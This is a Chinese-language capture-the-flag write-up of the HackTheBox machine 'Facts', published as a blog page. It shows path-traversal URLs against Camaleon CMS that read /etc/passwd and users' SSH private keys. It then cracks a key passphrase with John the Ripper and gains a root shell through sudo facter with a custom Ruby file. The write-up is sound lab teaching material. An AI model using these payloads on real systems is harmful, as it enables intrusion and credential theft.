@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="1. 信息搜集1.1 端口扫描对目标机器进行端口和服务扫描：开放的端口很少，从HTTP服务入手。 1nmap -sC -sV --min-rate&#x3D;10000 -p- -oN .&#x2F;nmap&#x2F;facts.nmap 10.129.221.146   访问目标机器的80端口，重定向到了facts.htb这个域名。  在&#x2F;etc&#x2F;hosts文件中添加域名解析之后即可正常访问。  1.2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox Machine Facts">
+<meta property="og:url" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="1. 信息搜集1.1 端口扫描对目标机器进行端口和服务扫描：开放的端口很少，从HTTP服务入手。 1nmap -sC -sV --min-rate&#x3D;10000 -p- -oN .&#x2F;nmap&#x2F;facts.nmap 10.129.221.146   访问目标机器的80端口，重定向到了facts.htb这个域名。  在&#x2F;etc&#x2F;hosts文件中添加域名解析之后即可正常访问。  1.2">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/1770468255403.png">
+<meta property="og:image" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/1770468372893.png">
+<meta property="og:image" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/1770468404672.png">
+<meta property="og:image" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/1770468574339.png">
+<meta property="og:image" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/1770469092775.png">
+<meta property="og:image" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/1770469215128.png">
+<meta property="og:image" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/1770469314837.png">
+<meta property="og:image" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/1770469379095.png">
+<meta property="og:image" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/1770470167111.png">
+<meta property="og:image" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/1770470781495.png">
+<meta property="og:image" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/1770470959482.png">
+<meta property="og:image" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/1770471911376.png">
+<meta property="og:image" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/1770472814475.png">
+<meta property="og:image" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/1770473003655.png">
+<meta property="og:image" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/1770473017899.png">
+<meta property="og:image" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/1770473927161.png">
+<meta property="og:image" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/1770473752405.png">
+<meta property="og:image" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/1770474319824.png">
+<meta property="og:image" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/1770474661380.png">
+<meta property="article:published_time" content="2026-02-07T12:32:13.000Z">
+<meta property="article:modified_time" content="2026-02-07T14:32:53.984Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="camaleon_cms">
+<meta property="article:tag" content="facter">
+<meta property="article:tag" content="lfi">
+<meta property="article:tag" content="ssh">
+<meta property="article:tag" content="sudo">
+<meta property="article:tag" content="ubuntu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/02/07/HackTheBox-Machine-Facts/1770468255403.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox Machine Facts</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/01/31/HackTheBox-Machine-Luke/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/02/07/HackTheBox-Machine-Facts/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/02/07/HackTheBox-Machine-Facts/&text=HackTheBox Machine Facts"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/02/07/HackTheBox-Machine-Facts/&title=HackTheBox Machine Facts"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/02/07/HackTheBox-Machine-Facts/&is_video=false&description=HackTheBox Machine Facts"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox Machine Facts&body=Check out this article: http://example.com/2026/02/07/HackTheBox-Machine-Facts/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/02/07/HackTheBox-Machine-Facts/&title=HackTheBox Machine Facts"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/02/07/HackTheBox-Machine-Facts/&title=HackTheBox Machine Facts"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/02/07/HackTheBox-Machine-Facts/&title=HackTheBox Machine Facts"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/02/07/HackTheBox-Machine-Facts/&title=HackTheBox Machine Facts"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/02/07/HackTheBox-Machine-Facts/&name=HackTheBox Machine Facts&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/02/07/HackTheBox-Machine-Facts/&t=HackTheBox Machine Facts"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">1. 信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-Web%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 Web枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%9D%E5%A7%8B%E7%AB%8B%E8%B6%B3"><span class="toc-number">2.</span> <span class="toc-text">2. 初始立足</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-CVE-2024-46987"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 CVE-2024-46987</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-SSH%E7%A7%81%E9%92%A5%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 SSH私钥连接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.</span> <span class="toc-text">3. 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-Sudo%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 Sudo提权</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox Machine Facts
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-02-07T12:32:13.000Z" class="dt-published" itemprop="datePublished">2026-02-07</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/camaleon-cms/" rel="tag">camaleon_cms</a>, <a class="p-category" href="/tags/facter/" rel="tag">facter</a>, <a class="p-category" href="/tags/lfi/" rel="tag">lfi</a>, <a class="p-category" href="/tags/ssh/" rel="tag">ssh</a>, <a class="p-category" href="/tags/sudo/" rel="tag">sudo</a>, <a class="p-category" href="/tags/ubuntu/" rel="tag">ubuntu</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="1-信息搜集"><a href="#1-信息搜集" class="headerlink" title="1. 信息搜集"></a>1. 信息搜集</h2><h3 id="1-1-端口扫描"><a href="#1-1-端口扫描" class="headerlink" title="1.1 端口扫描"></a>1.1 端口扫描</h3><p>对目标机器进行端口和服务扫描：开放的端口很少，从HTTP服务入手。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV --min-rate=10000 -p- -oN ./nmap/facts.nmap 10.129.221.146</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/07/HackTheBox-Machine-Facts/1770468255403.png" alt="1770468255403"></p>
+<p>访问目标机器的80端口，重定向到了facts.htb这个域名。</p>
+<p><img src="/2026/02/07/HackTheBox-Machine-Facts/1770468372893.png" alt="1770468372893"></p>
+<p>在&#x2F;etc&#x2F;hosts文件中添加域名解析之后即可正常访问。</p>
+<p><img src="/2026/02/07/HackTheBox-Machine-Facts/1770468404672.png" alt="1770468404672"></p>
+<h3 id="1-2-Web枚举"><a href="#1-2-Web枚举" class="headerlink" title="1.2 Web枚举"></a>1.2 Web枚举</h3><p>前台页面的功能点很少，值得关注的只有一个搜索功能点，简单测试发现并不存在SQL注入。</p>
+<p><img src="/2026/02/07/HackTheBox-Machine-Facts/1770468574339.png" alt="1770468574339"></p>
+<p>继续枚举（目录扫描、从静态文件中搜索），寻找后台路径或者一些文件泄露等。</p>
+<p>简单尝试之后，发现访问&#x2F;admin路径会自动跳转到&#x2F;admin&#x2F;login登录页面。</p>
+<p><img src="/2026/02/07/HackTheBox-Machine-Facts/1770469092775.png" alt="1770469092775"></p>
+<p>在浏览器的调试器中发现了CMS的静态资源路径。</p>
+<p><img src="/2026/02/07/HackTheBox-Machine-Facts/1770469215128.png" alt="1770469215128"></p>
+<p>确认了是camaleon_cms，需要继续确认版本号。</p>
+<p>创建一个用户用于登录。</p>
+<p><img src="/2026/02/07/HackTheBox-Machine-Facts/1770469314837.png" alt="1770469314837"></p>
+<p>登录后台之后成功在右下角发现了版本为2.9.0。</p>
+<p><img src="/2026/02/07/HackTheBox-Machine-Facts/1770469379095.png" alt="1770469379095"></p>
+<h2 id="2-初始立足"><a href="#2-初始立足" class="headerlink" title="2. 初始立足"></a>2. 初始立足</h2><h3 id="2-1-CVE-2024-46987"><a href="#2-1-CVE-2024-46987" class="headerlink" title="2.1 CVE-2024-46987"></a>2.1 CVE-2024-46987</h3><p>在Github camaleon_cms的Security中找到了<a target="_blank" rel="noopener" href="https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-cp65-5m9r-vc2c">路径穿越漏洞</a>的详细信息。</p>
+<p>此漏洞描述并不准确，官网中描述的影响范围是2.8.0&lt;2.8.2，漏洞细节如下。</p>
+<p><img src="/2026/02/07/HackTheBox-Machine-Facts/1770470167111.png" alt="1770470167111"></p>
+<p>经过测试，2.9.0版本仍然存在该漏洞：从&#x2F;etc&#x2F;passwd文件中得到<code>trivia</code>和<code>william</code>用户名。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/07/HackTheBox-Machine-Facts/1770470781495.png" alt="1770470781495"></p>
+<p>继续文件包含，查看系统信息：当前操作系统是Ubuntu 25.04。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/os-release</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/07/HackTheBox-Machine-Facts/1770470959482.png" alt="1770470959482"></p>
+<h3 id="2-2-SSH私钥连接"><a href="#2-2-SSH私钥连接" class="headerlink" title="2.2 SSH私钥连接"></a>2.2 SSH私钥连接</h3><p>尝试包含上面两个用户的SSH连接私钥：找到了用ed25519算法生成的SSH私钥。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/home/&lt;username&gt;/.ssh/id_rsa</span><br><span class="line">/home/&lt;username&gt;/.ssh/id_ed25519</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/07/HackTheBox-Machine-Facts/1770471911376.png" alt="1770471911376"></p>
+<p>用id_ed25519私钥文件进行SSH连接，发现需要连接密码。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_ed25519 trivia@10.129.244.96</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/07/HackTheBox-Machine-Facts/1770472814475.png" alt="1770472814475"></p>
+<p>用ssh2john结合john进行爆破，得到密码<code>dragonballz</code>。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh2john id_ed25519 &gt; sshhash</span><br><span class="line">john -w=/usr/share/wordlists/rockyou.txt sshhash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/07/HackTheBox-Machine-Facts/1770473003655.png" alt="1770473003655"></p>
+<p>现在可以正常进行SSH连接了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_ed25519 trivia@10.129.244.96</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/07/HackTheBox-Machine-Facts/1770473017899.png" alt="1770473017899"></p>
+<h2 id="3-权限提升"><a href="#3-权限提升" class="headerlink" title="3. 权限提升"></a>3. 权限提升</h2><h3 id="3-1-Sudo提权"><a href="#3-1-Sudo提权" class="headerlink" title="3.1 Sudo提权"></a>3.1 Sudo提权</h3><p>查看当前用户可以以管理员身份执行的命令。</p>
+<p><img src="/2026/02/07/HackTheBox-Machine-Facts/1770473927161.png" alt="1770473927161"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/puppetlabs/facter">facter</a>是一个用于收集系统基本信息（硬件、网络、版本等）的命令行工具。</p>
+<p>目标机器上facter的版本为4.10.0。</p>
+<p><img src="/2026/02/07/HackTheBox-Machine-Facts/1770473752405.png" alt="1770473752405"></p>
+<p>在<a target="_blank" rel="noopener" href="https://gtfobins.org/gtfobins/facter/#inherit">GTFObins</a>中有关于该命令行工具的提权利用。</p>
+<p>–custeom-dir参数可以让facter自动执行指定目录下的第一个.rb结尾的文件。</p>
+<p>首先在&#x2F;tmp目录下创建一个.rb文件用于读取&#x2F;root&#x2F;root.txt文件。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts <span class="title class_">File</span>.read(<span class="string">&quot;/root/root.txt&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>之后用facter执行即可。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo facter --custom-dir=/tmp/ x</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/07/HackTheBox-Machine-Facts/1770474319824.png" alt="1770474319824"></p>
+<hr>
+<p>上面读取文件，现在直接执行&#x2F;bin&#x2F;bash获取一个root用户的Shell。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec &quot;/bin/bash&quot;</span><br></pre></td></tr></table></figure>
+
+<p>之后用facter执行即可得到一个root用户的Shell。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo facter --custom-dir=/tmp/ x</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/07/HackTheBox-Machine-Facts/1770474661380.png" alt="1770474661380"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">1. 信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-Web%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 Web枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%9D%E5%A7%8B%E7%AB%8B%E8%B6%B3"><span class="toc-number">2.</span> <span class="toc-text">2. 初始立足</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-CVE-2024-46987"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 CVE-2024-46987</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-SSH%E7%A7%81%E9%92%A5%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 SSH私钥连接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.</span> <span class="toc-text">3. 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-Sudo%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 Sudo提权</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/02/07/HackTheBox-Machine-Facts/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/02/07/HackTheBox-Machine-Facts/&text=HackTheBox Machine Facts"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/02/07/HackTheBox-Machine-Facts/&title=HackTheBox Machine Facts"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/02/07/HackTheBox-Machine-Facts/&is_video=false&description=HackTheBox Machine Facts"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox Machine Facts&body=Check out this article: http://example.com/2026/02/07/HackTheBox-Machine-Facts/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/02/07/HackTheBox-Machine-Facts/&title=HackTheBox Machine Facts"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/02/07/HackTheBox-Machine-Facts/&title=HackTheBox Machine Facts"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/02/07/HackTheBox-Machine-Facts/&title=HackTheBox Machine Facts"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/02/07/HackTheBox-Machine-Facts/&title=HackTheBox Machine Facts"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/02/07/HackTheBox-Machine-Facts/&name=HackTheBox Machine Facts&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/02/07/HackTheBox-Machine-Facts/&t=HackTheBox Machine Facts"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
